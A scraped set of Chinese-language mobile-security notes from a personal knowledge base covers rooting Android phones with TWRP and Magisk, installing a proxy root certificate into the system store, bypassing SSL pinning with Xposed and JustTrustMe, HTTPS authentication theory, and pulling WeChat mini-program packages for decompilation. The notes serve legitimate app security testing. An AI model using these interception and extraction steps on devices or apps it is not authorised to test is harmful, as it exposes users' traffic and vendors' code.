com.oppo.launcher ** Activity starting: com.android.mms ** Activity starting: com.android.mms ** ERROR: PROCESS CRASHED processName: com.nsfocus.softkeyboard processPid: 12273 0x2 查看包存放的路径 ╭─[aaronluo@localhost]-[~] ╰─➤ adb shell pm path com.nsfocus.softkeyboard package:/data/app/com.nsfocus.softkeyboard-1/base.apk 0x3 导出 ╭─[aaronluo@localhost]-[~/Desktop] ╰─➤ adb pull /data/app/com.nsfocus.softkeyboard-1/base.apk /data/app/com.nsfocus.softkeyboard-1/base.apk: 1 file pulled, 0 skipped. 1.4 MB/s (35164 bytes in 0.024s) 0 Copyright © aaron 2023 all right reserved，powered by Gitbook该文章修订时间： 2023-06-02 22:32:17 Author: aaron Url: https://byaaronluo.github.io/知识库/05.移动安全/00.Android扫盲.html Source: aaron 知识库 This article was originally published in「aaron 知识库」,Reproduced please indicate the source, thank you for cooperation! "},"知识库/05.移动安全/01.安卓ROOT抓包及绕过SSLPinning.html":{"url":"知识库/05.移动安全/01.安卓ROOT抓包及绕过SSLPinning.html","title":"01.安卓ROOT抓包及绕过SSLPinning","keywords":"","body":" 安卓手机相关科普 基本分区 BootLoader（fastboot） recovery boot userdata（/Data） cache 安卓系统启动流程 开发者模式 解锁bootloader 手机root 刷入第三方Recovery 下载TWRP Recovery 刷入recovery 进入Recovery 刷入magisk 刷入安装包 启动Magisk 安装Edxposed 抓包测试 ROOT后写入根证书 导出证书（以Charles为准） 制作安卓系统证书 上传证书 参考链接 这里使用公司的小米6做为测试机型 安卓手机相关科普 基本分区 BootLoader（fastboot） Android 系统虽然也是基于 Linux 系统的，但是由于 Android 属于嵌入式设备，并没有像 PC 那样的 BIOS 程序。 取而代之的是 Bootloader —— 系统启动加载器。 一旦bootloader分区出了问题，手机变砖就很难救回了。除非借由高通9008或者MTK-Flashtool之类更加底层的模式来救砖。 一般刷机不动这个分区。 recovery 用于存放recovery恢复模式的分区，刷机、root必须要动的分区。里面有一套linux内核，但并不是安卓系统里的那个，相当于一个小pe的存在。现阶段的刷机、root基本都要用第三方rec来覆盖官方rec。 boot 引导分区，虽然说是引导，但实际是在bootloader之后，与recovery同级的启动顺序。里面装了安卓的linux内核相关的东西，magisk就是修改了这部分程序，实现的root权限的获取。 userdata（/Data） 用户数据分区，被挂载到/data路径下。内置存储器（内置存储卡）实际也存在这个分区里，用户安装的apk、app的数据都在这个分区。目前主流安卓版本中data分区通过fuse进行了强制加密，密码一般都是屏锁密码，且加密的data分区未必能在recovery下成功解密，所以有时刷机需要清除整个data分区。 cache 缓存分区，一般用于OTA升级进入recovery前，临时放置OTA升级包以及保存OTA升级的一些临时输出文件。 安卓系统启动流程 一般来说，安卓系统的刷机都是在fastboot和recovery进行的，因为此时安卓系统本身还没有启动，直接无视各种权限进行操作。 fastboot通常又被叫做线刷模式，PC端通过fastboot程序直接向手机刷写分区镜像文件，fastboot无法进行更加细致的操作，一刷就是整个分区，而不能对某个、某些文件进行特定的修改。 recovery模式下可以刷入带有脚本的zip包，可以实现对系统的增量修补，修改特定文件等更细致、强大的功能，但问题在于官方的recovery拥有签名校验，非官方的zip包无法通过官方的recovery刷入，于是我们需要刷入第三方的recovery来运行非官方签名的刷机包的刷入。于是我们就需要在fastboot下刷入第三方的recovery。 但是，fastboot的刷入也有限制，未解锁的fastboot（也就是bootloader锁、bl锁）不允许刷入非官方签名过的img镜像，所以我们需要对bootloader进行解锁，国内允许解锁bl锁的厂商就只有小米了，所以像搞机得用小米的机子。 通过解锁bootloader来刷入第三方的recovery，再通过第三方的recovery来刷入第三方的刷机包（如magisk或是其它的系统）达到直接或间接修改boot、system等分区的文件，这就是刷机的真谛。 其中Magisk作用于boot.img的阶段。Magisk的安装实际是将boot分区导出然后进行patche后再重新刷入。magisk通过直接修改boot.img中的linux内核相关文件实现了root权限的获取，也是由于其在很靠前的位置，可以通过在system分区挂载时，额外挂载分区、文件、目录来实现对系统文件的替换、修改而不修改原始文件。 开发者模式 开发者模式是安卓给安卓开发人员提供的高级调试，以小米6为例子，打开开发者模式 点击设置->我的设备->全部参数 多次点击MIUI版本，当出现您已处于“开发者模式，无需进行此操作”即表示已进入开发者模式 在设置->更多设置->开发者选项->开启开发者选项 点击开启开发者选项，即表示已开启开发者选项 解锁bootloader 用于解锁小米手机的bootloader的工具包，如果你的手机有bl锁就需要进行解锁。 bl锁解锁教程见“小米、红米手机解锁bootloader” 下载地址：http://www.miui.com/unlock/download.html 在需要解锁的设备中登录已经具备解锁权限的小米账号，并进入“设置 -> 开发者选项 -> 设备解锁状态”中绑定账号和设备； 绑定成功后，手动进入Bootloader模式（关机后，同时按住开机键和音量下键）； 下载手机解锁工具(解锁工具官网)，在PC端的小米解锁工具中，登录相同的小米账号，并通过USB连接手机； 点击PC端解锁工具的“解锁”按钮，根据提示信息等待指定时间后再次尝试或者立即解锁； 解锁Bootloader过程中可能遇到的问题Q：解锁工具提示“账号设备不一致”是怎么回事？ A：这是在解锁过程中没有通过账号与设备验证，解决办法是先将手机升级到最新的稳定版或者从稳定版卡刷到最新的开发版，在待解锁的设备和解锁工具上要登陆同一个账号，并进入“设置 -> 开发者选项 -> 设备解锁状态”中绑定账号和设备。 Q：解锁工具提示“无法获取手机信息”是怎么回事？ A：这种情况一般是电脑上的设备驱动没有装好，可以尝试重插USB线或者换个USB接口或者换根USB线来等待电脑慢慢安装驱动，或在工具右上角驱动安装模块中主动安装驱动。 Q：解锁失败显示“账号与设备的绑定时间太短，xxx个小时后再解锁” A：在售的新机型一般需要等待，用户账号安全评分较低的需要等待，等待时间目前是7天起，如果本年度解锁手机数超过2台，等待时间会相应增长。 Q：解锁失败显示“此账号本月解锁次数达到上限” A：一个小米账号每月限制解锁一台设备。 Q：解锁失败显示“此账号本年累计解锁次数已达上限” A：一个小米账号每年限制解锁4台不同设备。 Q：解锁失败显示“账号权限不足或者账号受限” A：账号存在安全风险，无法处理解锁操作，建议更换账号。 Q：解锁失败显示“未知错误-1” A：网络异常，请更换时间段或更换网络进行解锁。 手机root 这里我选择的是先线刷一个稳定版本的包，然后曲线救国安装开发版本包 线刷：http://www.miui.com/shuaji-393.html 卡刷：http://www.miui.com/shuaji-329.html 其中线刷的时候千万不要上锁，上锁之后解锁很麻烦 卡刷在手动选择安装包的时候，也需要手工开启 点击设置->我的设备->系统更新，多次点击logo，再点右上角的三个点（更多），即可看到手动选择安装包 当刷上开发版本之后，在授权管理处，将手机root 刷入第三方Recovery 由于官方的recovery模式功能有限，且不允许刷入非官方签名的刷机包，于是我们需要刷入第三方recovery。 目前全球最大的主流第三方recovery是TWRP项目，其官网为https://twrp.me/ 下载TWRP Recovery 点击devices 选择xiaomi 选择机型 点击下载 下载后得到一个镜像文件 这个时候就已经准备好了recovery文件了 刷入recovery 注：需要用到的fastboot.exe，在adb工具包里是有的：https://developer.android.com/studio/releases/platform-tools#downloads 手动进入Bootloader模式（关机后，同时按住开机键和音量下键），通过数据线连接到电脑。 通过cmd或powershell打开fastboot工具 # 查看已连接的设备 fastboot.exe devices # 刷入下载好的文件 fastboot.exe flash recovery recovery.img 其命令原型为 fastboot flash [要刷入的分区] [要刷入的镜像文件] 注意：这里一定要注意手机一定要解开bootloader锁才能写入成功 此时twrp已被刷入，但别急着重启，直接重启系统会导致系统将recovery还原，我们需要直接进入到twrp中。 先按下音量加和电源键，在手机屏幕熄灭时松开电源键，手机显示小米logo并震动时松开音量键，等待片刻即可进入recovery。 进入Recovery 注：进入recovery的按键组合是音量加与电源键长按 首次进入twrp时系统会提示是否修改系统分区，先去点击Change Language，将语言改成中文。然后将蓝色的条滑动到右侧，表示允许修改。 图片引用一下GLRpiz师傅的图，我也是按照GLRpiz师傅的步骤一步一步做出来的 刷入magisk Magisk的官方下载连接在：https://github.com/topjohnwu/Magisk 下载后我们得到了Magisk-v23.0.apk文件 注意：Magisk的apk安装包经过特殊处理，扩展名改为zip即为recovery下使用的刷机包，apk即为安卓使用的magisk管理app。 刷入安装包 警告：以下操作将会清空手机内所有用户数据 将手机进入到TWRP Recovery下，通过数据线连接电脑，电脑此时会弹出一个MTP设备，我们会发现文件夹和文件都是乱码的，这是因为高版本安卓下整个Data分区使用了fuse作为强制加密，Recovery下无法将其解密。但是我们必须要通过某种渠道，将刷机包放在Recovery能够访问的路径中，此时有两种选择，OTG插U盘读取刷机包，或者直接格式化整个Data分区，此处使用后者 点击TWRP的清除按钮、选择格式化Data分区 成功后点击重启按钮中的Recovery，手机将重启到TWRP Recovery中，此时电脑中的MTP设备就会变成一个空设备，这时我们在将Magisk-v23.0.apk改名为Magisk-v23.0.zip复制到手机中，点击安装按钮刷入该刷机包。我们需要到/sdcard路径里去找这个包 选中后，滑动确认刷入，当出现done字样且控制台不再有输出，点击reboot system重启系统即可。 此时magisk应该以及成功装入到boot分区了 注意：重启系统后，data分区将被安卓系统本身再次格式化、并进行强制加密。如果中间出了什么岔子，需要再到TWRP中刷入刷机包，需要再次手动格式化Data分区。 启动Magisk 进入系统后会发现Magisk还需要进一步安装，此时需要将Magisk-v23.0.apk安装到手机中，之后Magisk会提示系统需要重启之类的，等待系统重启再次进入系统 安装Edxposed 安卓7以上就不支持xposed了，因为xposed没有去适配新系统，在这里我们使用开源的Edxposed 首先需要在Magisk上先安装riru，因为riru-edxposed依赖Riru，这里需要注意，riru-Edxposed 不支持riru 26 的版本，所以在这里需要在github上下载低一个版本的riru，比如V25版本，https://github.com/RikkaApps/Riru/releases 然后安装 justtrustme，这个justtrustme是无图形化的app，用于解决app内ssl证书校验的，简单来说，JustTrustMe 是将 APK 中所有用于校验 SSL 证书的 API 都进行了 Hook，从而绕过证书检查。 那么这里就有疑问了，为什么不直接安装justtrustme？ 因为justtrustme依赖于xposed框架，它是xposed框架里支持的一个模块，而xposed框架需要root且magisk的支持 安装好了之后，在Edxposed框架->模块中，就会出现justtrustme的这个模块，然后重启一下，抓包测试 抓包测试 注意，安装好模块且启用之后，需要重启 由于之前将Charles的根证书写到了/system/etc/security/cacerts,这里我将该证书关闭，使用Edxposed+justtrustme来抓包 然后设置代理，在Charles中可以看到可以抓到weibo，支付宝 ROOT后写入根证书 安卓7.0以后，安卓不信任用户安装的证书，所以抓https时无法解码请求，对于第三方应用，需要将证书添加为系统证书，比如使用安卓模拟器(兼容性差，很多应用闪退)，使用xposed框架等，这里再推荐一种添加系统证书的方法 注意：需要手机有root权限,以下操作以小米6为准,其他品牌手机操作可能有差别 导出证书（以Charles为准） help --> SSL Proxying --> Save Charles Root Certificate... 制作安卓系统证书 将导出的证书计算hash值，并生成系统系统预设格式证书文件 //.cer格式证书 openssl x509 -inform DER -subject_hash_old -in 证书文件.cer //.pem格式证书 openssl x509 -inform PEM -subject_hash_old -in 证书文件.pem //cer格式 openssl x509 -inform DER -text -in xxx.cer > 43340bc0.0 //pem格式 openssl x509 -inform PEM -text -in xxx.pem > 43340bc0.0 最后编辑一下输出的文件，把 -----BEGIN CERTIFICATE----- 到最后的这部分移动到开头。结果如下 上传证书 adb push 43340bc0.0 /sdcard/Download adb root shell adb shell mount -o remount,rw /system cp /sdcard/Download/43340bc0.0 /system/etc/security/cacerts/ chmod 644 /system/etc/security/cacerts/43340bc0.0 mount -o remount,ro /system 自己入手了一台测试机是Google的Pixel3，在挂载/system目录的时候会报错（自己刷的安卓9，boot.img 写入magisk） 这时，只需要挂根目录（/）就可以了 最后一步必不可少，把拥有写权限的system目录更改为原设定为只可读，不然就会变砖 写进去之后，在系统证书中，就可以看到我们添加的证书了 参考链接 https://forum.butian.net/share/1068 https://forum.butian.net/share/1069 https://blog.csdn.net/weixin_31702225/article/details/117694829 Copyright © aaron 2023 all right reserved，powered by Gitbook该文章修订时间： 2023-05-24 15:28:02 Author: aaron Url: https://byaaronluo.github.io/知识库/05.移动安全/01.安卓ROOT抓包及绕过SSLPinning.html Source: aaron 知识库 This article was originally published in「aaron 知识库」,Reproduced please indicate the source, thank you for cooperation! "},"知识库/05.移动安全/02.IOS抓包及绕过SSL.html":{"url":"知识库/05.移动安全/02.IOS抓包及绕过SSL.html","title":"02.IOS抓包及绕过SSL","keywords":"","body":" 移动设备下载证书 安装证书 信任证书 测试 ios app 在没有SSL双向认证的情况下，是不用越狱就可以抓到https的，在这里使用Charles为例 移动设备下载证书 help --> SSL Proxying --> Install Charles Root Certificate on a Mobile Device Remote Browser.. 首先配置好WiFi 代理，然后在Safari浏览器中输入chls.pro/ssl 安装证书 然后到设置->通用->VPN 与设备管理 点击Charles的证书，点击安装 信任证书 打开设置-通用-关于本机-证书信任设置，打开刚刚安装的证书开关 测试 app.crctrust.com:8444 这个app在安卓平台是okhttp框架，且ssl为双向认证，导致无法抓包，但是在ios上是可以抓包如下，这个项目也只做到了ios就到此为止了 Copyright © aaron 2023 all right reserved，powered by Gitbook该文章修订时间： 2023-05-19 10:21:51 Author: aaron Url: https://byaaronluo.github.io/知识库/05.移动安全/02.IOS抓包及绕过SSL.html Source: aaron 知识库 This article was originally published in「aaron 知识库」,Reproduced please indicate the source, thank you for cooperation! "},"知识库/05.移动安全/03.Pixel3刷机.html":{"url":"知识库/05.移动安全/03.Pixel3刷机.html","title":"03.Pixel3刷机","keywords":"","body":" 刷机前置信息 解锁BL 开始刷机 安装管理界面 ROM相关教程 脱壳 frida hook 其他 安装Magisk 安装系统证书 安装EdXposed 安装LSPosed 模块推荐 时间校准的问题 手机投屏到PC 刷机前置信息 目的：脱壳 解锁BL \"解锁BL\"通常是指解锁Android设备的Bootloader（引导程序）。Bootloader是Android设备的一部分，它是负责启动Android操作系统的程序。当设备的Bootloader被锁定时，用户将无法在设备上安装自定义操作系统或修改系统文件等。因此，解锁Bootloader可以让用户获得更高的设备控制权和更广泛的自定义选项，但也可能导致设备的保修失效或安全风险增加。 要确定Android设备的Bootloader（引导程序）是否已解锁，可以按照以下步骤操作： 打开设备并进入“开发者选项”。如果你不知道如何打开开发者选项，请前往设备设置，然后找到“关于手机”或“关于平板电脑”，在其中找到“版本号”并连续点击7次，直到提示你已进入开发者选项。 进入开发者选项后，在其中找到“OEM解锁”或“解锁引导程序”等选项，如果它是开启的，那么设备的Bootloader已经解锁。 开始刷机 先升级一下本地的ADB brew upgrade android-platform-tools --cask 镜像下载地址：https://developers.google.cn/android/images?hl=zh-cn 小版本选QP1A.190711.020 点击“Link”开始下载，下载好后解压，大概长这个样 再解压image-blueline-qp1a.190711.020.zip这个压缩包 然后去GitHub下载专门拖壳镜像，主页选择自己合适的版本，我是pixel 3，就选blueline。 这里因为刷主页原来的ROM，magisk一直有问题，所以找了一个偏方 解压新下载的，然后替换覆盖 替换后把image-blueline-qp1a.190711.020压缩回去 zip -r image-blueline-qp1a.190711.020.zip * 运行 adb reboot bootloader fastboot flashing unlock # 按下音量键，选择unlock adb reboot fastboot bash flash-all.sh 运行完出现Finished.就说明OK了，手机也会启动，到这刷机就OK了 安装管理界面 MikManager是一个rom逆向工具的管理界面。该软件用于对接MikRom来实现rom层面的逆向工具。仅仅提供界面化操作管理，并将用户需求保存为json数据，由MikRom解析后进行相应的执行，并导出结果到对应的目录。 wget https://github.com/dqzg12300/MikManager/releases/download/v1.0.1/mikmanager.apk adb install -t mikmanager.apk ROM相关教程 参考GitHub 脱壳 每次脱壳前记得删除原脱壳保留的dump目录 正常脱壳，打开APP后会等待60秒才开始脱壳 如果脱壳失败，或者脱壳太慢，可以选择白名单进行脱壳，出现xxx_repair.dex就说明是脱完了 frida hook pip3 install frida==15.1.11 pip3 install frida-tools==10.0.0 其他 安装Magisk 参考：https://blog.isteed.cc/post/pixel-3-install-magisk/ 先安装好Magisk apk adb install Magisk-v25.2.apk 然后在刚才刷机ROM替换的文件中找到boot.img 传送boot.img文件到手机上 adb push boot.img /sdcard/Download/ 再用Magisk修补这个文件 Magisk Manager - 安装 - 选择并修补一个文件 - 选择传到手机上的boot.img文件 - 开始 修补后拷贝到电脑上（如果拷贝到一半总断开，然后连不上设备，大概率是USB电源供电不足的问题，可以采用其他办法如通过ES文件浏览器开一个FTP来下载） adb pull /sdcard/Download/magisk_patched-25200_5RDnr.img ./ 进入fastboot模式 adb reboot bootloader 运行修补的img fastboot boot magisk_patched-25200_5RDnr.img 然后会开机，拥有临时的 Magisk ，打开Magisk，选择安装，选择”直接安装“即可。 最后重启就OK了 [!NOTE] 如果提示“检测到不属于Magisk的su文件”可以不管，不影响使用，这是因为ROM中自带了一个su。 本来想解决的，尝试用adb disable-verity再挂载也不行，放弃了，等到后期不得不改再想办法吧。 安装系统证书 [!DANGER] 正常情况下，在Android7上通过《移动端各种方式抓包》就可以安装系统证书，但是这个ROM不行，尝试了disable-verity、remount等等都不行，查了好久的资料，最后还是通过magisk来成功安装证书。 在Magisk官方介绍中，可见magisk模块保存在/data/adb/modules里 且模块中的system目录下的内容会递归合并到真实的system目录下 所以我们直接将证书放到这个目录下就可以了，操作如下： # 计算证书hash openssl x509 -inform der -subject_hash_old -in cacert.der -noout # 重命名为.0 mv cacert.der 9a5ba575.0 # 在magisk模块目录下创建对应的文件夹 adb root adb shell \"mkdir -p /data/adb/modules/hosts/system/etc/security/cacerts\" # 推送证书到对应的目录 adb push 9a5ba575.0 /data/adb/modules/hosts/system/etc/security/cacerts/ 安装后在Magisk的模块应该就能看到了，重启后系统里面也会添加上对应的证书。 安装EdXposed [!TIP] *posed系列的东西不是很有必要，主要还是装了有解决不了的BUG，模块会提示“此模块因被安装在SD卡中而导致无法加载，请将其移动到内部存储” 参考GitHub: https://github.com/ElderDrivers/EdXposed/wiki/%E7%AE%80%E4%BB%8B 先下载 Riru、EdXposed 注意：Riru要下载v25.4.4的，不然会有BUG，参考issue adb push riru-v25.4.4-release.zip /sdcard/Download/ adb push EdXposed-v0.5.2.2_4683-master-release.zip /sdcard/Download/ 在Magisk管理端中从本地安装模块，先安装Riru，再安装EdXposed，最后重启，重启后在Magisk里面就可以看到刚才安装的模块了。 然后下载EdXposedManager并安装 adb install EdXposedManager-4.6.2-46200-org.meowcat.edxposed.manager-release.apk 在面具中安装好对应的Riru版本，以及Riru-EdXposed模块之后 在对应的EdXposed 仲可以看到框架已被激活 但是当我们安装如JustTrustMe模块，会显示此模块因被安装在SD卡中而导致无法加载，请将其移动到内部存储中，试过搜索引擎提供的所有方法，包括ChatGPT，都告知需要将其存储更改为内部存储，但是该机器是无外置内存卡，只有一种可能就是在分区的时候给划分区域弄错了，但是可以不使用xposed框架吗，答案是可以的，但是每次都需要去hook SSL，不易持久化，所以尽量还是想想解决办法 最后在设置中，将关闭状态勾选上，重启EdXposed就可以使用模块了（一定要重启EdXposed app） 当勾选上JustTrustMe之后，重启手机即可使用 为什么我一定要用这个？ 因为持久化会比较方便 其次为了解决一些简单的app的双向认证（frida也可以，但是每次都要动手操作，很麻烦），以及浏览器不信任证书的问题（主要是浏览器不信任burp、charles证书的问题） 不想再折腾了，搞这个rom以及配置所有的环境遇到了各种各样的问题，最后得出结论，让其保持相对稳定即可 安装LSPosed 先下载Riru、LSPosed adb push riru-v26.1.7.r530.ab3086ec9f-release.zip /sdcard/Download/ adb push LSPosed-v1.8.6-6712-riru-release.zip /sdcard/Download/ 在Magisk管理端中从本地安装模块，先安装Riru，再安装LSPosed，最后重启，重启后在Magisk里面就可以看到刚才安装的模块了。 在消息提示栏中就可以看到LSPosed的管理界面了。 模块推荐 Magisk: https://github.com/Magisk-Modules-Repo EdXposed | LSPosed: https://github.com/Xposed-Modules-Repo https://modules.lsposed.org/ 时间校准的问题 在“设置 -> 系统 -> 时间”处，时区选择中国上海，也就是GMT+08:00 adb shell settings put global ntp_server ntp1.aliyun.com adb reboot 手机投屏到PC 安装scrcpy进行屏幕镜像，安装过程记得挂代理，不然会很慢很慢，而且会经常失败。 brew install scrcpy 使用 scrcpy -h scrcpy 可以在电脑上直接操作手机 Copyright © aaron 2023 all right reserved，powered by Gitbook该文章修订时间： 2023-06-02 22:59:39 Author: aaron Url: https://byaaronluo.github.io/知识库/05.移动安全/03.Pixel3刷机.html Source: aaron 知识库 This article was originally published in「aaron 知识库」,Reproduced please indicate the source, thank you for cooperation! "},"知识库/05.移动安全/04.HTTP单向验证-双向验证解释.html":{"url":"知识库/05.移动安全/04.HTTP单向验证-双向验证解释.html","title":"04.HTTP单向验证-双向验证解释","keywords":"","body":" HTTP简介 HTTPS单向认证 HTTPS双向认证 HTTPS基本思路总结 抓包原理 反抓包策略 突破SSL-Pinning抓包 突破证书双向验证抓包 总结 HTTP简介 HTTP（HyperText Transfer Protocol，超文本传输协议）被用于在Web浏览器和网站服务器之间传递信息，在TCP/IP中处于应用层。这里提一下TCP/IP的分层共分为四层：应用层、传输层、网络层、数据链路层; 分层的目的是：分层能够解耦，动态替换层内协议 各个层包含的内容： 应用层：向用户提供应用服务时的通讯活动（ftp，dns，http） 传输层：网络连接中两台计算机的数据传输（tcp、udp） 网络层：处理网络上流动的数据包，通过怎样的传输路径把数据包传送给对方（ip） 数据链路层：与硬件相关的网卡、设备驱动等等 然而HTTP也有以下明显缺点： 通信使用明文，内容可能被窃听 不验证通信方的身份，因此有可能遭遇伪装 无法证明报文的完整性，所以有可能遭到篡改 这样，HTTPS就登场了。HTTPS中的S表示SSL或者TLS，就是在原HTTP的基础上加上一层用于数据加密、解密、身份认证的安全层，即 HTTP + 加密 + 认证 + 完整性保护 = HTTPS 加密相关的预备知识：对称加密和非对称加密。 对称加密 ： 加密和解密数据使用同一个密钥。这种加密方式的特点是速度很快，常见对称加密的算法有 AES； 非对称加密： 加密和解密使用不同的密钥，这两个密钥形成有且仅有唯一的配对，叫公钥和私钥。数据用公钥加密后必须用私钥解密，数据用私钥加密后必须用公钥解密。一般来说私钥自己保留好，把公钥公开给别人（一般公钥不会单独出现，而是会写进证书中），让别人拿自己的公钥加密数据后发给自己，这样只有自己才能解密。 这种加密方式的特点是速度慢，CPU 开销大，常见非对称加密算法有 RSA。 CA证书的相关知识： CA证书是由CA（Certification Authority）机构发布的数字证书。其内容包含：电子签证机关的信息、公钥用户信息、公钥、签名和有效期。这里的公钥服务端的公钥，这里的签名是指：用hash散列函数计算公开的明文信息的信息摘要，然后采用CA的私钥对信息摘要进行加密，加密完的密文就是签名。 即：证书 = 公钥 + 签名 +申请者和颁发者的信息。 客户端中因为在操作系统中就预置了CA的公钥，所以支持解密签名（因为签名使用CA的私钥加密的） 有了这些预备知识后，就可以来看看HTTPS是如何怎么做到安全认证的。 HTTPS单向认证 从上图可以看出，服务端拥有一对非对称密钥：B公钥和B私钥。详细过程如下： （1）客户端发起HTTPS请求，将SSL协议版本的信息发送给服务端。 （2）服务端去CA机构申请来一份CA证书，在前面提过，证书里面有服务端公钥和签名。将CA证书发送给客户端 （3）客户端读取CA证书的明文信息，采用相同的hash散列函数计算得到信息摘要（hash目的：验证防止内容被修改），然后用操作系统带的CA的公钥去解密签名（因为签名是用CA的私钥加密的），对比证书中的信息摘要。如果一致，则证明证书是可信的，然后取出了服务端公钥 （4）客户端生成一个随机数（密钥F），用刚才等到的服务端B公钥去加密这个随机数形成密文，发送给服务端。 （5）服务端用自己的B私钥去解密这个密文，得到了密钥F （6）服务端和客户端在后续通讯过程中就使用这个密钥F进行通信了。和之前的非对称加密不同，这里开始就是一种对称加密的方式 HTTPS双向认证 双向认证和单向认证原理基本差不多，单向认证客户端需要认证服务端，而在双向认证中增加了服务端对客户端的认证 双向认证详细过程如下： （1）客户端发起HTTPS请求，将SSL协议版本的信息发送给服务端。 （2）服务端去CA机构申请来一份CA证书，在前面提过，证书里面有服务端公钥和签名。将CA证书发送给客户端 （3）客户端读取CA证书的明文信息，采用相同的hash散列函数计算得到信息摘要（hash目的：验证防止内容被修改），然后用操作系统带的CA的公钥去解密签名（因为签名是用CA的私钥加密的），对比证书中的信息摘要。如果一致，则证明证书是可信的，然后取出了服务端公钥 （4）客户端发送自己的客户端证书给服务端，证书里面有客户端的公钥：C公钥 （5）客户端发送支持的对称加密方案给服务端，供其选择 （6）服务端选择完加密方案后，用刚才得到的C公钥去加密选好的加密方案 （7）客户端用自己的C私钥去解密选好的加密方案，客户端生成一个随机数（密钥F），用刚才等到的服务端B公钥去加密这个随机数形成密文，发送给服务端。 （8)服务端和客户端在后续通讯过程中就使用这个密钥F进行通信了。和之前的非对称加密不同，这里开始就是一种对称加密的方式 HTTPS基本思路总结 HTTPS在保证数据安全传输上使用对称加密和非对称加密相结合的方式来进行的，简单来说就是通过一次非对称加密算法进行了最终通信密钥的生成、确认和交换，然后在后续的通信过程中使用最终通信密钥进行对称加密通信。之所以不是全程非对称加密，是因为非对称加密的计算量大，影响通信效率。 抓包原理 常用的HTTPS抓包方式是作为中间人，对客户端伪装成服务端，对服务端伪装成客户端。简单来说： 截获客户端的HTTPS请求，伪装成中间人客户端去向服务端发送HTTPS请求 接受服务端返回，用自己的证书伪装成中间人服务端向客户端发送数据内容。 具体过程如下图所示： 反抓包策略 为了防止中间人攻击，可以使用SSL-Pinning的技术来反抓包。 可以发现中间人攻击的要点的伪造了一个假的服务端证书给了客户端，客户端误以为真。解决思路就是，客户端也预置一份服务端的证书，比较一下就知道真假了。 SSL-pinning有两种方式： 证书锁定（Certificate Pinning） 和公钥锁定（ Public Key Pinning）。 证书锁定 需要在客户端代码内置仅接受指定域名的证书，而不接受操作系统或浏览器内置的CA根证书对应的任何证书，通过这种授权方式，保障了APP与服务端通信的唯一性和安全性，因此客户端与服务端（例如API网关）之间的通信是可以保证绝对安全。但是CA签发证书都存在有效期问题，缺点是在 证书续期后需要将证书重新内置到APP中。 公钥锁定 提取证书中的公钥并内置到客户端中，通过与服务器对比公钥值来验证连接的正确性。制作证书密钥时，公钥在证书的续期前后都可以保持不变（即密钥对不变），所以可以避免证书有效期问题，一般推荐这种做法。 突破SSL-Pinning抓包 思路是这样的：内置证书或者公钥的时候，常常会有对比验证的函数，直接控制这个函数的返回结果让验证通过不就好了吗。 于是就有了一个突破SLL-Pinning的经典操作：采用Xposed+justTrustme模块。 这个方案使用的是JustTrustMe这个Xposed模块，它所做的事情就是将各种已知的的HTTP请求库中用于校验证书的API都进行Hook，使无论是否是可信证书的情况，校验结果返回都为正常状态，从而实现绕过证书检查的效果。 突破证书双向验证抓包 参考《证书双向验证抓包.md》 总结 单向认证客户端需要认证服务端，而在双向认证中增加了服务端对客户端的认证。 https抓不到包可能是使用了SSL Pinning或者证书双向验证来防止的。 HTTPS抓不到包的情况下，进行以下尝试 判断是不是SSL Pinning的技术来反抓包（直接用Xposed+justTrustme模块看看能不能抓包） 突破证书双向验证进行抓包 Copyright © aaron 2023 all right reserved，powered by Gitbook该文章修订时间： 2023-06-02 22:26:19 Author: aaron Url: https://byaaronluo.github.io/知识库/05.移动安全/04.HTTP单向验证-双向验证解释.html Source: aaron 知识库 This article was originally published in「aaron 知识库」,Reproduced please indicate the source, thank you for cooperation! "},"知识库/05.移动安全/05.低版本安卓安装好apk无法打开情况分析.html":{"url":"知识库/05.移动安全/05.低版本安卓安装好apk无法打开情况分析.html","title":"05.低版本安卓安装好apk无法打开情况分析","keywords":"","body":" 背景 报错详情 参考链接 背景 今天在做安卓的项目的时候，发现安装好的apk不管在测试机还是模拟器中都无法打开，并且提示此应用未安装 在进行安装的时候，使用adb install 以及下载远程apk文件进行安装都报此错 报错详情 使用logcat 抓取app在运行态中的日志，发现如下报错 首先可以看到运行app的时候提示是没有权限，进而分析，通过aapt获取AndroidManifest.xml在mainActivity中可以看到设置的exported为0x0，这里就很奇怪了，mainActivity是app入口，如果属性exported为false则不能被android调用，则不能正常启动程序 然后再反编译查看AndroidManifest.xml，可以看到android.exported确实是为false。。。 log的意思是说不能app的进程不能被其他进程(这里指的是com.android.launcher，即手机的launcher应用)调用。解决方法就是在MainActivity的属性中添加exported=\"true\" 参考链接 https://blog.csdn.net/u013270444/article/details/52860854 Copyright © aaron 2023 all right reserved，powered by Gitbook该文章修订时间： 2023-05-19 10:21:54 Author: aaron Url: https://byaaronluo.github.io/知识库/05.移动安全/05.低版本安卓安装好apk无法打开情况分析.html Source: aaron 知识库 This article was originally published in「aaron 知识库」,Reproduced please indicate the source, thank you for cooperation! "},"知识库/05.移动安全/06.获取微信小程序源码.html":{"url":"知识库/05.移动安全/06.获取微信小程序源码.html","title":"06.获取微信小程序源码","keywords":"","body":" 获取微信小程序的源码 方法一：直接抓包法 前提 操作步骤 结果 方法二：本地缓存文件读取法 前提 操作步骤 结果 其他 微信开发者工具调试 调试过程 参考 获取支付宝小程序的源码 JS美化 获取微信小程序的源码 方法一：直接抓包法 小程序一般会先向微信服务器上下载小程序的资源，所以抓包一定情况下可以看到 新版的微信小程序采用了zstd压缩，所以下载后需要先解压，老版本没压缩可以直接下载源码，这是一个需要注意的地方 前提 手机上无该小程序的缓存文件，如果有，进行如下操作 操作步骤 1、使用fiddler抓包，获取小程序资源下载链接 PS：burp也可以，只是感觉fiddler抓手机包更快 2、下载小程序 3、zstd解压 zstd -d xxx.zstd 4、解压后添加后缀.wxapkg，然后进行反编译，此处以wxappUnpacker为例 结果 反编译后的目录结果 反编译后的内容 方法二：本地缓存文件读取法 网上基本都用的这个办法，感觉不如上面那个好用，还麻烦！！！ 这是2019年记录的，可能现在存在一些误差，有问题及时联系我 前提 手机root 手机已经访问过小程序，在系统中存在缓存 安装RE文件管理器 操作步骤 1、首先访问如下目录/data/data/com.tencent.mm/MicroMsg/，找到wxapkg文件 2、拖到电脑（此处我用的adb，也可以使用模拟器的共享文件夹等） ## adb命令 adb pull /data/data/com.tencent.mm/MicroMsg/d32f736510b7c9582b5fc1aa3673b2bb/appbrand/pkg/debug_826840826_2_-1071461312 3、使用WxApkgUnpacker.exe反编译wxapkg获取源文件 结果 其他 有些工具下载地址挂了，可以多在github上找找，这里提供一些本地下载吧 WxApkgUnpacker.exe wxappUnpacker-master.zip 